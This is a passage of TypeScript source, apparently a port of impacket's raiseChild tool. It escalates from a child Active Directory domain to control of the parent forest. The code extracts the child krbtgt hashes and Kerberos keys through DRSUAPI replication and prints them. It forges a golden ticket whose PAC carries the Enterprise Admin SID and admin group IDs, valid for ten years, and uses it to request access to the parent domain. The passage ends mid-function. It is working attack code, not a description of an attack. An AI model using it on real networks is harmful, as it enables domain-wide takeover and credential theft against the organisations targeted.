#!/usr/bin/env node
/**
 * Child-domain to forest privilege escalation as detailed by Sean Metcalf
 * (@PyroTek3). Uses golden tickets with ExtraSids researched and implemented
 * by Benjamin Delpy (@gentilkiwi) in mimikatz.
 *
 * Workflow:
 *   1) Find child domain controller + forest FQDN (NRPC DsrGetDcNameEx)
 *   2) Get forest Enterprise Admin SID (LSAT)
 *   3) Get child krbtgt credentials (DRSUAPI)
 *   4) Forge golden ticket with Enterprise Admin ExtraSid
 *   5) Use golden ticket to get parent krbtgt + target user creds
 *   6) Optionally save ccache / PSEXEC into parent
 *
 * Original impacket author: Alberto Solino (@agsolino)
 * TypeScript port for jspacket.
 */

import { Buffer } from 'node:buffer';
import { parseArgs } from 'node:util';
import { promises as dns } from 'node:dns';

import {
  parseIdentity,
  init as initLogger,
  initProxy,
  info,
  error as logError,
  critical,
  debug as logDebug,
  warning,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';

import { SMBConnection } from '@impacket/smb-connection';
import {
  DCERPCTransportFactory,
  MSRPC_UUID_NRPC,
  hDsrGetDcNameEx,
  MSRPC_UUID_LSAT,
  POLICY_LOOKUP_NAMES,
  hLsarLookupSids,
  LsapLookupLevel,
  hLsarOpenPolicy2,
  hLsarQueryInformationPolicy2,
  POLICY_INFORMATION_CLASS,
  MAXIMUM_ALLOWED,
  MSRPC_UUID_DRSUAPI,
  DRSBind,
  DRS_EXTENSIONS_INT,
  DRSGetNCChanges,
  DSNAME,
  PARTIAL_ATTR_VECTOR_V1_EXT,
  NTDSAPI_CLIENT_GUID,
  NULLGUID,
  DRS_EXT_GETCHGREQ_V6,
  DRS_EXT_GETCHGREPLY_V6,
  DRS_EXT_GETCHGREQ_V8,
  DRS_EXT_STRONG_ENCRYPTION,
  DRS_INIT_SYNC,
  DRS_WRIT_REP,
  EXOP_REPL_OBJ,
  DS_NAME_FORMAT,
  hDRSDomainControllerInfo,
  hDRSCrackNames,
  decryptAttributeValue,
  removeDESLayer,
  makeAttid,
  oidFromAttid,
  PrefixTableEntry,
  RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
  RPC_C_AUTHN_GSS_NEGOTIATE,
  NULL,
  NDRULONG,
  RPC_SID,
  type DCERPC_v5,
  unpackUserProperties,
  USER_PROPERTY,
  KERB_KEY_DATA_NEW,
  KERB_STORED_CREDENTIAL_NEW,
  SE_GROUP_MANDATORY,
  SE_GROUP_ENABLED_BY_DEFAULT,
  SE_GROUP_ENABLED,
  heptMap,
} from '@impacket/dcerpc';

import {
  Asn1,
  CCache as CCacheModule,
  Constants,
  Crypto,
  Pac,
  Types,
  KerberosV5,
} from '@impacket/krb5';

import { lmowfV1, ntowfV1 } from '@impacket/ntlm';

import type { Asn1Sequence, AnyValue } from '@impacket/asn1';

const SE_GROUP_ATTRS = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED;

// ---------------------------------------------------------------------------
// Attribute lookups for DRSUAPI
// ---------------------------------------------------------------------------

const NAME_TO_ATTRTYP: Record<string, number> = {
  objectSid: 0x90092,
  userPrincipalName: 0x90290,
  sAMAccountName: 0x900DD,
  unicodePwd: 0x9005A,
  dBCSPwd: 0x90037,
  supplementalCredentials: 0x9007D,
};

const ATTRTYP_TO_ATTID: Record<string, string> = {
  objectSid: '1.2.840.113556.1.4.146',
  userPrincipalName: '1.2.840.113556.1.4.656',
  sAMAccountName: '1.2.840.113556.1.4.221',
  unicodePwd: '1.2.840.113556.1.4.90',
  dBCSPwd: '1.2.840.113556.1.4.55',
  supplementalCredentials: '1.2.840.113556.1.4.125',
};

const KERBEROS_TYPE: Record<number, string> = {
  1: 'dec-cbc-crc',
  3: 'des-cbc-md5',
  17: 'aes128-cts-hmac-sha1-96',
  18: 'aes256-cts-hmac-sha1-96',
  0xffffff74: 'rc4_hmac',
};

// ---------------------------------------------------------------------------
// Credential types
// ---------------------------------------------------------------------------

interface Creds {
  username: string;
  password: string;
  domain: string;
  lmhash: Buffer | string;
  nthash: Buffer | string;
  aesKey: string;
  TGT: TGTBundle | null;
  TGS: any;
}

interface TGTBundle {
  KDC_REP: Buffer;
  cipher: Crypto.EnctypeProfile;
  oldSessionKey: Crypto.Key;
  sessionKey: Crypto.Key;
}

interface DumpedCreds {
  lmhash: string;
  nthash: string;
  aes128Key: string | null;
  aes256Key: string | null;
}

// ---------------------------------------------------------------------------
// Helper: resolve IP to DNS machine name via SMB
// ---------------------------------------------------------------------------

async function getDNSMachineName(ip: string): Promise<string> {
  try {
    const s = new SMBConnection(ip, ip);
    try { await s.login('', ''); } catch { /* expected — anonymous may fail */ }
    const name = s.getServerName() + '.' + s.getServerDNSDomainName();
    try { await s.logoff(); } catch { /* */ }
    return name;
  } catch {
    return ip;
  }
}

async function getMachineName(ip: string): Promise<string> {
  try {
    const s = new SMBConnection(ip, ip);
    try { await s.login('', ''); } catch { /* */ }
    const name = s.getServerName();
    try { await s.logoff(); } catch { /* */ }
    return name;
  } catch {
    return ip;
  }
}

async function resolveHost(name: string): Promise<string> {
  try {
    const addrs = await dns.resolve4(name);
    return addrs[0] ?? name;
  } catch {
    return name;
  }
}

// ---------------------------------------------------------------------------
// NRPC: get child domain info + forest name
// ---------------------------------------------------------------------------

async function getChildInfo(creds: Creds, doKerberos: boolean): Promise<[string, string]> {
  logDebug('Calling NRPC DsrGetDcNameEx()');
  const target = creds.domain;
  let machineNameOrIp: string;
  if (doKerberos) {
    machineNameOrIp = await getDNSMachineName(await resolveHost(target));
    logDebug(`${await resolveHost(target)} is ${machineNameOrIp}`);
  } else {
    machineNameOrIp = target;
  }

  const stringBinding = `ncacn_np:${machineNameOrIp}[\\pipe\\netlogon]`;
  const rpctransport = DCERPCTransportFactory(stringBinding);
  rpctransport.setCredentials(
    creds.username, creds.password as string, creds.domain,
    creds.lmhash as string, creds.nthash as string,
  );
  if (doKerberos || creds.aesKey) {
    rpctransport.setKerberos(true);
  }

  const dce = rpctransport.getDceRpc();
  await dce.connect();
  await dce.bind(MSRPC_UUID_NRPC);

  const resp = await hDsrGetDcNameEx(dce, NULL as any, NULL as any, NULL as any, NULL as any, 0) as any;
  const dci = resp.get('DomainControllerInfo');
  const domainName = (dci.get('DomainName') as string).replace(/\0$/, '');
  const forestName = (dci.get('DnsForestName') as string).replace(/\0$/, '');
  await dce.disconnect();
  return [domainName, forestName];
}

// ---------------------------------------------------------------------------
// LSAT: get parent SID + target user name
// ---------------------------------------------------------------------------

async function getParentSidAndTargetName(
  parentDC: string,
  creds: Creds,
  targetRID: string,
  doKerberos: boolean,
): Promise<[string, string]> {
  let machineNameOrIp: string;
  if (doKerberos) {
    machineNameOrIp = await getDNSMachineName(await resolveHost(parentDC));
    logDebug(`${await resolveHost(parentDC)} is ${machineNameOrIp}`);
  } else {
    machineNameOrIp = await resolveHost(parentDC);
  }

  logDebug('Calling LSAT hLsarQueryInformationPolicy2()');
  const stringBinding = `ncacn_np:${machineNameOrIp}[\\pipe\\lsarpc]`;
  const rpctransport = DCERPCTransportFactory(stringBinding);
  rpctransport.setCredentials(
    creds.username, creds.password as string, creds.domain,
    creds.lmhash as string, creds.nthash as string,
  );
  rpctransport.setKerberos(doKerberos);

  const dce = rpctransport.getDceRpc();
  await dce.connect();
  await dce.bind(MSRPC_UUID_LSAT);

  const openResp = await hLsarOpenPolicy2(dce as any, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES);
  const policyHandle = openResp.get('PolicyHandle');

  const qResp = await hLsarQueryInformationPolicy2(
    dce as any, policyHandle,
    POLICY_INFORMATION_CLASS.enumValues['PolicyAccountDomainInformation']!,
  );
  const policyInfo = qResp.get('PolicyInformation');
  const accountDomainInfo = policyInfo.get('PolicyAccountDomainInfo');
  const domainSidObj = accountDomainInfo.get('DomainSid');
  const domainSid = typeof domainSidObj.formatCanonical === 'function'
    ? domainSidObj.formatCanonical()
    : domainSidObj.get('Data').formatCanonical();

  const sids = [`${domainSid}-${targetRID}`];
  const lookupResp = await hLsarLookupSids(
    dce as any, policyHandle, sids,
    LsapLookupLevel.enumValues.LsapLookupWksta,
  ) as any;
  const names = lookupResp.get('TranslatedNames').get('Names');
  const targetName = names[0].get('Name') as string;

  await dce.disconnect();
  return [domainSid, targetName.replace(/\0$/, '')];
}

// ---------------------------------------------------------------------------
// DRSUAPI: connect + bind + get NtdsDsaObjectGuid
// ---------------------------------------------------------------------------

let drsr: DCERPC_v5 | null = null;
let hDrs: any = null;
let ntdsDsaObjectGuid: any = null;
let prefixTable: any[] = [];
let ppartialAttrSet: any = null;

async function connectDrds(domainName: string, creds: Creds, doKerberos: boolean): Promise<void> {
  let machineNameOrIp: string;
  if (doKerberos || creds.TGT != null) {
    machineNameOrIp = await getDNSMachineName(await resolveHost(domainName));
    logDebug(`${await resolveHost(domainName)} is ${machineNameOrIp}`);
  } else {
    machineNameOrIp = await resolveHost(domainName);
  }

  const stringBinding = await heptMap(machineNameOrIp, MSRPC_UUID_DRSUAPI, undefined, 'ncacn_ip_tcp');
  const rpc = DCERPCTransportFactory(stringBinding!);
  rpc.setRemoteHost(machineNameOrIp);
  if (creds.TGT != null) {
    rpc.setCredentials(creds.username, '', creds.domain);
    rpc.setKerberos(true);
  } else {
    rpc.setCredentials(
      creds.username, creds.password as string, creds.domain,
      creds.lmhash as string, creds.nthash as string,
    );
    rpc.setKerberos(doKerberos);
  }

  drsr = rpc.getDceRpc();
  drsr.setAuthLevel(RPC_C_AUTHN_LEVEL_PKT_PRIVACY);
  if (doKerberos || creds.TGT != null) {
    drsr.setAuthType(RPC_C_AUTHN_GSS_NEGOTIATE);
  }
  await drsr.connect();
  await drsr.bind(MSRPC_UUID_DRSUAPI);

  const request = new DRSBind();
  request.set('puuidClientDsa', NTDSAPI_CLIENT_GUID);
  const drs = new DRS_EXTENSIONS_INT();
  drs.set('cb', drs.getData().length);
  drs.set('dwFlags',
    DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 |
    DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION,
  );
  drs.set('SiteObjGuid', NULLGUID);
  drs.set('Pid', 0);
  drs.set('dwReplEpoch', 0);
  drs.set('dwFlagsExt', 0);
  drs.set('ConfigObjGUID', NULLGUID);
  drs.set('dwExtCaps', 127);
  const pextClient = request.get('pextClient') as any;
  pextClient.set('cb', drs.getData().length);
  pextClient.set('rgb', Array.from(drs.getData()));
  let resp = await (drsr as any).request(request);

  const drsExtensionsInt = new DRS_EXTENSIONS_INT();
  const ppextServerObj = resp.get('ppextServer') as any;
  const rgb = ppextServerObj.get('rgb');
  const rgbBuf = Array.isArray(rgb) ? Buffer.from(rgb as number[]) : (rgb as Buffer);
  const ppextServer = Buffer.concat([
    rgbBuf,
    Buffer.alloc(Math.max(0, drsExtensionsInt.getData().length - (ppextServerObj.get('cb') as number))),
  ]);
  drsExtensionsInt.fromString(ppextServer);

  if (Number(drsExtensionsInt.get('dwReplEpoch')) !== 0) {
    logDebug(`DC's dwReplEpoch != 0, setting it to ${drsExtensionsInt.get('dwReplEpoch')} and calling DRSBind again`);
    drs.set('dwReplEpoch', drsExtensionsInt.get('dwReplEpoch'));
    pextClient.set('cb', drs.getData().length);
    pextClient.set('rgb', Array.from(drs.getData()));
    resp = await (drsr as any).request(request);
  }

  hDrs = resp.get('phDrs');

  const dcInfoResp = await hDRSDomainControllerInfo(drsr as any, hDrs, domainName, 2) as any;
  if (dcInfoResp.get('pmsgOut').get('V2').get('cItems') > 0) {
    ntdsDsaObjectGuid = dcInfoResp.get('pmsgOut').get('V2').get('rItems')[0].get('NtdsDsaObjectGuid');
  } else {
    throw new Error(`Couldn't get DC info for domain ${domainName}`);
  }
}

// ---------------------------------------------------------------------------
// DRSUAPI: DRSCrackNames + DRSGetNCChanges
// ---------------------------------------------------------------------------

async function drsCrackNames(
  target: string,
  formatOffered: number,
  formatDesired: number,
  name: string,
  creds: Creds,
  doKerberos: boolean,
): Promise<any> {
  if (drsr === null) {
    await connectDrds(target, creds, doKerberos);
  }
  return hDRSCrackNames(drsr! as any, hDrs, 0, formatOffered, formatDesired, [name]);
}

async function drsGetNCChanges(userEntry: string): Promise<any> {
  const request = new DRSGetNCChanges();
  request.set('hDrs', hDrs);
  request.set('dwInVersion', 8);

  const pmsgIn = request.fields['pmsgIn'] as any;
  pmsgIn.set('tag', 8);
  const v8 = pmsgIn.fields['V8'] as any;
  v8.fields['uuidDsaObjDest'].set('Data', ntdsDsaObjectGuid);
  v8.fields['uuidInvocIdSrc'].set('Data', ntdsDsaObjectGuid);

  const dsName = new DSNAME();
  dsName.set('SidLen', 0);
  dsName.set('Guid', NULLGUID);
  dsName.set('Sid', '');
  dsName.set('NameLen', userEntry.length);
  dsName.set('StringName', userEntry + '\x00');
  dsName.set('structLen', dsName.getData().length);

  v8.fields['pNC'].fields['ReferentID'] = 1;
  v8.fields['pNC'].set('Data', dsName);
  v8.fields['usnvecFrom'].set('usnHighObjUpdate', 0);
  v8.fields['usnvecFrom'].set('usnHighPropUpdate', 0);
  v8.fields['pUpToDateVecDest'].fields['ReferentID'] = 0;
  v8.set('ulFlags', DRS_INIT_SYNC | DRS_WRIT_REP);
  v8.set('cMaxObjects', 1);
  v8.set('cMaxBytes', 0);
  v8.set('ulExtendedOp', EXOP_REPL_OBJ);

  if (ppartialAttrSet === null) {
    prefixTable = [];
    ppartialAttrSet = new PARTIAL_ATTR_VECTOR_V1_EXT();
    ppartialAttrSet.set('dwVersion', 1);
    ppartialAttrSet.set('cAttrs', Object.keys(ATTRTYP_TO_ATTID).length);
    for (const attId of Object.values(ATTRTYP_TO_ATTID)) {
      (ppartialAttrSet.get('rgPartialAttr') as any[]).push(makeAttid(prefixTable, attId));
    }
  }

  v8.fields['pPartialAttrSet'].fields['ReferentID'] = 1;
  v8.fields['pPartialAttrSet'].set('Data', ppartialAttrSet);

  const ptDest = v8.fields['PrefixTableDest'];
  ptDest.set('PrefixCount', prefixTable.length);
  const pPrefixEntry = ptDest.fields['pPrefixEntry'];
  pPrefixEntry.fields['ReferentID'] = 1;
  const ptEntries: any[] = [];
  for (const entry of prefixTable) {
    const pte = new PrefixTableEntry();
    pte.set('ndx', entry.ndx);
    const oidT = pte.fields['prefix'] as any;
    oidT.set('length', entry.prefix.length);
    const elements = oidT.fields['elements'];
    elements.fields['ReferentID'] = 1;
    elements.fields['Data'].fields['Data'] = Array.from(entry.prefix.elements);
    ptEntries.push(pte);
  }
  pPrefixEntry.fields['Data'].fields['Data'] = ptEntries;

  v8.fields['pPartialAttrSetEx1'].fields['ReferentID'] = 0;

  return (drsr! as any).request(request);
}

// ---------------------------------------------------------------------------
// Decrypt hashes + supplemental info from DRSUAPI response
// ---------------------------------------------------------------------------

function decryptHash(record: any, prefixTbl: any[] | null): [number, string, string] {
  let rid = 0;
  let lmHash: Buffer | null = null;
  let ntHash: Buffer | null = null;

  const attrs = record.get('pmsgOut').get('V6').get('pObjects').get('Entinf').get('AttrBlock').get('pAttr');
  for (const attr of attrs) {
    let attId: any;
    let lookupTable: Record<string, any>;
    try {
      attId = oidFromAttid(prefixTbl as any, attr.get('attrTyp'));
      lookupTable = ATTRTYP_TO_ATTID;
    } catch {
      attId = attr.get('attrTyp');
      lookupTable = NAME_TO_ATTRTYP;
    }

    if (attId === lookupTable['dBCSPwd']) {
      if (attr.get('AttrVal').get('valCount') > 0) {
        const blob = getAttrBuf(attr);
        const encryptedLM = decryptAttributeValue(drsr!, blob);
        lmHash = removeDESLayer(encryptedLM, rid);
      } else {
        lmHash = lmowfV1('', '', '');
      }
    } else if (attId === lookupTable['unicodePwd']) {
      if (attr.get('AttrVal').get('valCount') > 0) {
        const blob = getAttrBuf(attr);
        const encryptedNT = decryptAttributeValue(drsr!, blob);
        ntHash = removeDESLayer(encryptedNT, rid);
      } else {
        ntHash = ntowfV1('', '', '');
      }
    } else if (attId === lookupTable['objectSid']) {
      if (attr.get('AttrVal').get('valCount') > 0) {
        const objectSid = getAttrBuf(attr);
        rid = objectSid.readUInt32LE(objectSid.length - 4);
      } else {
        throw new Error(`Cannot get objectSid for ${record.get('pmsgOut').get('V6').get('pNC').get('StringName')}`);
      }
    }
  }

  if (lmHash === null) lmHash = lmowfV1('', '', '');
  if (ntHash === null) ntHash = ntowfV1('', '', '');
  return [rid, lmHash.toString('hex'), ntHash.toString('hex')];
}

function getAttrBuf(attr: any): Buffer {
  const pAVal = attr.get('AttrVal').get('pAVal');
  const pVal = pAVal[0].get('pVal');
  if (Buffer.isBuffer(pVal)) return pVal;
  if (Array.isArray(pVal)) return Buffer.from(pVal);
  return Buffer.from(String(pVal));
}

function decryptSupplementalInfo(record: any, prefixTbl: any[] | null): { aes128Key: string | null; aes256Key: string | null } | null {
  let plainText: Buffer | null = null;
  const attrs = record.get('pmsgOut').get('V6').get('pObjects').get('Entinf').get('AttrBlock').get('pAttr');

  for (const attr of attrs) {
    let attId: any;
    let lookupTable: Record<string, any>;
    try {
      attId = oidFromAttid(prefixTbl as any, attr.get('attrTyp'));
      lookupTable = ATTRTYP_TO_ATTID;
    } catch {
      attId = attr.get('attrTyp');
      lookupTable = NAME_TO_ATTRTYP;
    }

    if (attId === lookupTable['supplementalCredentials']) {
      if (attr.get('AttrVal').get('valCount') > 0) {
        const blob = getAttrBuf(attr);
        plainText = decryptAttributeValue(drsr!, blob);
        if (plainText.length < 24) plainText = null;
      }
    }
  }

  const kerberosKeys: { aes128Key: string | null; aes256Key: string | null } = {
    aes128Key: null,
    aes256Key: null,
  };

  if (plainText) {
    try {
      const [, propertyCount, propertiesData] = unpackUserProperties(plainText);
      let remaining = propertiesData;
      for (let i = 0; i < propertyCount; i++) {
        let userProperty: any;
        try {
          userProperty = new USER_PROPERTY(remaining);
        } catch {
          break;
        }
        remaining = remaining.subarray(userProperty.getData().length);
        const propName = (userProperty.get('PropertyName') as Buffer).toString('utf16le');
        if (propName === 'Primary:Kerberos-Newer-Keys') {
          const propertyValueHex = (userProperty.get('PropertyValue') as Buffer).toString('ascii');
          const propertyValueBuffer = Buffer.from(propertyValueHex, 'hex');
          const kerbStored = new KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer);
          let data = (kerbStored.get('Buffer') as Buffer);
          const credCount = kerbStored.get('CredentialCount') as number;
          for (let c = 0; c < credCount; c++) {
            const keyData = new KERB_KEY_DATA_NEW(data);
            data = data.subarray(keyData.getData().length);
            const keyOffset = keyData.get('KeyOffset') as number;
            const keyLength = keyData.get('KeyLength') as number;
            const keyType = keyData.get('KeyType') as number;
            const keyValue = propertyValueBuffer.subarray(keyOffset, keyOffset + keyLength);
            if (keyType in KERBEROS_TYPE) {
              if (keyType === Constants.EncryptionTypes.aes128_cts_hmac_sha1_96) {
                kerberosKeys.aes128Key = keyValue.toString('hex');
              } else if (keyType === Constants.EncryptionTypes.aes256_cts_hmac_sha1_96) {
                kerberosKeys.aes256Key = keyValue.toString('hex');
              }
            }
          }
        }
      }
    } catch { /* malformed supplemental data */ }
  }

  if (kerberosKeys.aes128Key || kerberosKeys.aes256Key) return kerberosKeys;
  return null;
}

// ---------------------------------------------------------------------------
// Get credentials for a user via DRSUAPI
// ---------------------------------------------------------------------------

async function getCredentials(
  userName: string,
  domain: string,
  creds: Creds,
  doKerberos: boolean,
): Promise<[number, DumpedCreds]> {
  const upn = `${userName}@${domain}`;
  const crackedName = await drsCrackNames(
    domain,
    DS_NAME_FORMAT.enumValues['DS_USER_PRINCIPAL_NAME']!,
    DS_NAME_FORMAT.enumValues['DS_FQDN_1779_NAME']!,
    upn,
    creds,
    doKerberos,
  );

  const cItems = crackedName.get('pmsgOut').get('V1').get('pResult').get('cItems');
  if (cItems !== 1) {
    throw new Error(`DRSCrackNames returned ${cItems} items for user ${userName}`);
  }
  const item = crackedName.get('pmsgOut').get('V1').get('pResult').get('rItems')[0];
  const status = item.get('status');
  if (status !== 0) {
    throw new Error(`DRSCrackNames status returned error 0x${status.toString(16)}`);
  }

  const pName = (item.get('pName') as string).replace(/\0$/, '');
  const userRecord = await drsGetNCChanges(pName);

  if (userRecord.get('pmsgOut').get('V6').get('cNumObjects') === 0) {
    throw new Error("DRSGetNCChanges didn't return any object!");
  }

  const ptSrc = userRecord.get('pmsgOut').get('V6').get('PrefixTableSrc').get('pPrefixEntry');
  const [rid, lmhash, nthash] = decryptHash(userRecord, ptSrc);
  const kerberosKeys = decryptSupplementalInfo(userRecord, ptSrc);

  await drsr!.disconnect();
  drsr = null;

  const result: DumpedCreds = {
    lmhash,
    nthash,
    aes128Key: kerberosKeys?.aes128Key ?? null,
    aes256Key: kerberosKeys?.aes256Key ?? null,
  };
  return [rid, result];
}

// ---------------------------------------------------------------------------
// Golden ticket: modify TGT PAC with ExtraSids
// ---------------------------------------------------------------------------

function makeGolden(
  tgt: Buffer,
  originalCipher: Crypto.EnctypeProfile,
  sessionKey: Crypto.Key,
  ntHash: string,
  extraSid: string,
  aes128Key: string | null = null,
  aes256Key: string | null = null,
): [Buffer, Crypto.EnctypeProfile, Crypto.Key] {
  const asRep = Asn1.AS_REP() as Asn1Sequence;
  asRep.decode(tgt);

  const ticket = asRep.get('ticket') as Record<string, AnyValue>;
  const encPart = (ticket as any)['enc-part'] ?? ticket;
  const cipherText = encPart['cipher'] as Buffer;
  const etype = encPart['etype'] as number;

  const ticketAesKey = Crypto.get_matching_aes_key(etype, null, aes128Key, aes256Key);
  let key: Crypto.Key;
  try {
    key = Crypto.get_kerberos_key_for_enctype(etype, ntHash, null, aes128Key, aes256Key);
  } catch (e: any) {
    throw new RetryableGoldenTicketError(e.message);
  }

  const plainText = Crypto.decrypt(key, 2, cipherText);

  const encTicketPart = Asn1.EncTicketPart() as Asn1Sequence;
  encTicketPart.decode(plainText);

  const tenYears = new Date(Date.now() + 365 * 10 * 24 * 60 * 60 * 1000);
  encTicketPart.set('endtime', Types.KerberosTime.toAsn1(tenYears));
  encTicketPart.set('renew-till', Types.KerberosTime.toAsn1(tenYears));

  const authData = encTicketPart.get('authorization-data') as any[];
  const adData = authData[0]['ad-data'] as Buffer;

  const adIfRelevantNode = Asn1.AD_IF_RELEVANT() as any;
  adIfRelevantNode.decode(adData);
  const adItems = (adIfRelevantNode.items ?? adIfRelevantNode.get?.()) as any[];
  const pacData = adItems[0]['ad-data'] as Buffer;

  const pacType = new Pac.PACTYPE(pacData);
  const buffers = pacType.get('Buffers') as Buffer;
  const pacInfos = new Map<number, Buffer>();
  const cBuffers = pacType.get('cBuffers') as number;
  let bufPtr = buffers;

  for (let i = 0; i < cBuffers; i++) {
    const infoBuffer = new Pac.PAC_INFO_BUFFER(bufPtr);
    const offset = Number(infoBuffer.get('Offset') as bigint) - 8;
    const size = infoBuffer.get('cbBufferSize') as number;
    const data = (pacType.get('Buffers') as Buffer).subarray(offset, offset + size);
    pacInfos.set(infoBuffer.get('ulType') as number, data);
    bufPtr = bufPtr.subarray(infoBuffer.getData().length);
  }

  if (!pacInfos.has(Pac.PAC_LOGON_INFO)) {
    throw new Error('PAC_LOGON_INFO not found! Aborting');
  }

  const logonInfoData = pacInfos.get(Pac.PAC_LOGON_INFO)!;
  const validationInfo = new Pac.VALIDATION_INFO();
  validationInfo.fromString(logonInfoData);
  const lenVal = validationInfo.getData().length;
  validationInfo.fromStringReferents(logonInfoData, lenVal);

  const kerbData = validationInfo.get('Data') as any;
  const innerData = typeof kerbData.get === 'function' ? kerbData.get('Data') : kerbData;

  const groups = [513, 512, 520, 518, 519];
  const groupsPtr = innerData.fields.GroupIds as any;
  const groupsArr = groupsPtr.fields.Data as any;
  const groupItems: any[] = [];
  for (const gid of groups) {
    const gm = new Pac.GROUP_MEMBERSHIP();
    gm.set('RelativeId', gid);
    gm.set('Attributes', SE_GROUP_ATTRS);
    groupItems.push(gm);
  }
  groupsArr.fields.Data = groupItems;
  innerData.set('GroupCount', groups.length);

  let sidCount = Number(innerData.get('SidCount') ?? 0);
  if (sidCount === 0) {
    const userFlags = Number(innerData.get('UserFlags') ?? 0);
    innerData.set('UserFlags', userFlags | 0x20);
  }
  sidCount += 1;
  innerData.set('SidCount', sidCount);

  const extraSidsPtr = innerData.fields.ExtraSids as any;
  if (extraSidsPtr.fields.ReferentID === 0 || extraSidsPtr.fields.ReferentID === 0n) {
    extraSidsPtr.fields.ReferentID = 1;
  }
  const extraSidsArr = extraSidsPtr.fields.Data as any;
  if (!Array.isArray(extraSidsArr.fields.Data)) {
    extraSidsArr.fields.Data = [];
  }

  const sidAndAttrs = new Pac.KERB_SID_AND_ATTRIBUTES();
  const sidFieldPtr = sidAndAttrs.fields.Sid as any;
  const sidObj = sidFieldPtr.fields.Data as any;
  sidObj.fromCanonical(extraSid);
  sidAndAttrs.set('Attributes', SE_GROUP_ATTRS);
  (extraSidsArr.fields.Data as any[]).push(sidAndAttrs);

  const validationInfoBlob = Buffer.concat([validationInfo.getData(), validationInfo.getDataReferents()]);

  pacInfos.set(Pac.PAC_LOGON_INFO, validationInfoBlob);

  const newPacType = Pac.signPac(pacInfos, {
    aesKey: ticketAesKey,
    ntHash,
    inferAesSignatureType: true,
  });

  const authorizationData = Asn1.AuthorizationData() as any;
  const adEl = authorizationData.elementNode as Asn1Sequence;
  adEl.set('ad-type', Constants.AuthorizationDataType.AD_WIN2K_PAC);
  adEl.set('ad-data', newPacType.getData());
  authorizationData.add(adEl);
  const authorizationDataEncoded = authorizationData.encode();

  authData[0]['ad-data'] = authorizationDataEncoded;

  const encodedEncTicketPart = encTicketPart.encode();

  let key2: Crypto.Key;
  try {
    key2 = Crypto.get_kerberos_key_for_enctype(etype, ntHash, null, aes128Key, aes256Key);
  } catch (e: any) {
    throw new RetryableGoldenTicketError(e.message);
  }

  const newCipherText = Crypto.encrypt(key2, 2, encodedEncTicketPart);

  encPart['cipher'] = newCipherText;

  return [asRep.encode(), originalCipher, sessionKey];
}

class RetryableGoldenTicketError extends Error {}

// ---------------------------------------------------------------------------
// printKerberosKeys
// ---------------------------------------------------------------------------

function printKerberosKeys(domainName: string, targetUser: string, creds: DumpedCreds): void {
  if (creds.aes256Key) {
    console.log(`${domainName}/${targetUser}:aes256-cts-hmac-sha1-96s:${creds.aes256Key}`);
  }
  if (creds.aes128Key) {
    console.log(`${domainName}/${targetUser}:aes128-cts-hmac-sha1-96s:${creds.aes128Key}`);
  }
}

function getPreferredAesKey(creds: DumpedCreds): string | null {
  return creds.aes256Key ?? creds.aes128Key ?? null;
}

// ---------------------------------------------------------------------------
// raiseUp: the main escalation flow
// ---------------------------------------------------------------------------

async function raiseUp(
  childName: string,
  childCreds: Creds,
  parentName: string,
  targetRID: string,
  doKerberos: boolean,
  writeTGT: string | null,
  targetExec: string | null,
): Promise<void> {
  info(`Raising ${childName} to ${parentName}`);

  const [enterpriseSid, targetName] = await getParentSidAndTargetName(parentName, childCreds, targetRID, doKerberos);
  info(`${parentName} Enterprise Admin SID is: ${enterpriseSid}-519`);

  info(`Getting credentials for ${childName}`);
  const [rid, credentials] = await getCredentials('krbtgt', childName, childCreds, doKerberos);
  console.log(`${childName}/krbtgt:${rid}:${credentials.lmhash}:${credentials.nthash}:::`);
  printKerberosKeys(childName, 'krbtgt', credentials);

  const userName = new Types.Principal(
    childCreds.username,
    childCreds.domain.toUpperCase(),
    Constants.PrincipalNameType.NT_PRINCIPAL,
  );

  interface CredAttempt {
    label: string;
    lmhash: Buffer | string;
    nthash: Buffer | string;
    aesKey: string;
  }

  const credAttempts: CredAttempt[] = [];
  if (childCreds.aesKey) {
    credAttempts.push({ label: 'AES', lmhash: '', nthash: '', aesKey: childCreds.aesKey });
  }
  if (childCreds.nthash && (typeof childCreds.nthash === 'string' ? childCreds.nthash.length > 0 : childCreds.nthash.length > 0)) {
    credAttempts.push({ label: 'RC4', lmhash: childCreds.lmhash, nthash: childCreds.nthash, aesKey: '' });
  }
  if (childCreds.password) {
    credAttempts.push({ label: 'password', lmhash: '', nthash: '', aesKey: '' });
    const pwdRc4Nthash = ntowfV1(childCreds.password);
    const pwdRc4Lmhash = lmowfV1(childCreds.password);
    const explicitNthash = typeof childCreds.nthash === 'string' ? childCreds.nthash : childCreds.nthash.toString('hex');
    if (explicitNthash.length === 0 || pwdRc4Nthash.toString('hex') !== explicitNthash) {
      credAttempts.push({ label: 'password->RC4', lmhash: pwdRc4Lmhash, nthash: pwdRc4Nthash, aesKey: '' });
    }
  }

  if (credAttempts.length === 0) {
    throw new Error('No credentials provided');
  }

  let TGT: TGTBundle | null = null;
  let TGS: any = null;
  let succeeded = false;

  for (const attempt of credAttempts) {
    try {
      info(`Trying ${attempt.label} for TGT request`);
      const tgtResult = await KerberosV5.getKerberosTGT(
        userName,
        childCreds.password,
        childCreds.domain,
        attempt.lmhash,
        attempt.nthash,
        attempt.aesKey,
        null,
      );
      info(`TGT obtained using ${attempt.label}`);

      let goldenTicket: Buffer;
      let goldenCipher: Crypto.EnctypeProfile;
      let goldenSessionKey: Crypto.Key;

      try {
        [goldenTicket, goldenCipher, goldenSessionKey] = makeGolden(
          tgtResult.tgt, tgtResult.cipher, tgtResult.sessionKey,
          credentials.nthash, `${enterpriseSid}-519`,
          credentials.aes128Key, credentials.aes256Key,
        );
      } catch (e) {
        if (e instanceof RetryableGoldenTicketError) {
          warning(`${attempt.label} failed while building golden ticket (${e.message}), trying next method`);
          continue;
        }
        throw e;
      }

      TGT = {
        KDC_REP: goldenTicket,
        cipher: goldenCipher,
        oldSessionKey: tgtResult.key,
        sessionKey: goldenSessionKey,
      };

      let serverNameStr: string;
      if (targetExec === null) {
        serverNameStr = await getMachineName(await resolveHost(parentName));
      } else {
        serverNameStr = targetExec;
      }

      const serverName = new Types.Principal(
